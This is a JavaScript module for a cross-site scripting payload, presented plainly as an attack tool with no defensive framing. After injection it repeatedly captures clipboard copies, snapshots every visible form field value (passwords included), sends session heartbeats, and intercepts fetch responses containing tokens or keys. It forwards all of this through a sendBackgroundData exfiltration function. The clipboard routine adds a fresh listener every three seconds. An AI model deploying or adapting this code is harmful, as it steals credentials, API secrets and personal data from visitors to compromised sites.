// Name: Background Continuous Monitor
// Description: Runs continuously after initial payload fires, monitoring clipboard, forms, AJAX responses, and sends periodic heartbeats using sendBackgroundData()

(function() {
  // Wait for initial payload to complete and get payload_id
  setTimeout(function() {
    if (!window.xssPayloadId) {
      console.log('Waiting for payload ID...');
      // Try again in 2 seconds
      setTimeout(arguments.callee, 2000);
      return;
    }
    
    console.log('Starting background monitoring for payload:', window.xssPayloadId);
    
    // Monitor clipboard every 3 seconds
    setInterval(function() {
      // Check for copied text
      document.addEventListener('copy', function(e) {
        const selection = window.getSelection().toString();
        if (selection) {
          window.sendBackgroundData({
            title: "Background Clipboard Copy",
            data: {
              copied: selection.substring(0, 500),
              url: location.href,
              timestamp: new Date().toISOString()
            }
          });
        }
      });
    }, 3000);
    
    // Monitor form inputs every 5 seconds
    setInterval(function() {
      const formData = {};
      document.querySelectorAll('input:not([type="hidden"]), textarea').forEach(function(el) {
        if (el.value) {
          const key = el.name || el.id || 'field_' + Math.random().toString(36).substr(2, 5);
          formData[key] = el.value;
        }
      });
      
      if (Object.keys(formData).length > 0) {
        window.sendBackgroundData({
          title: "Background Form Snapshot",
          data: {
            forms: formData,
            pageTitle: document.title,
            timestamp: new Date().toISOString()
          }
        });
      }
    }, 5000);
    
    // Send heartbeat every 10 seconds to track session duration
    setInterval(function() {
      window.sendBackgroundData({
        title: "Session Heartbeat",
        data: {
          uptime: Math.floor((Date.now() - performance.timing.navigationStart) / 1000) + ' seconds',
          currentUrl: location.href,
          timestamp: new Date().toISOString()
        }
      });
    }, 10000);
    
    // Monitor for new AJAX responses
    const originalFetch = window.fetch;
    window.fetch = function() {
      return originalFetch.apply(this, arguments).then(function(response) {
        response.clone().text().then(function(text) {
          // Only send if response contains interesting data
          if (text.includes('token') || text.includes('api') || text.includes('key')) {
            window.sendBackgroundData({
              title: "Background AJAX Response",
              data: {
                url: response.url,
                status: response.status,
                preview: text.substring(0, 500),
                timestamp: new Date().toISOString()
              }
            });
          }
        });
        return response;
      });
    };
    
  }, 3000); // Initial delay to ensure payload_id is received
})();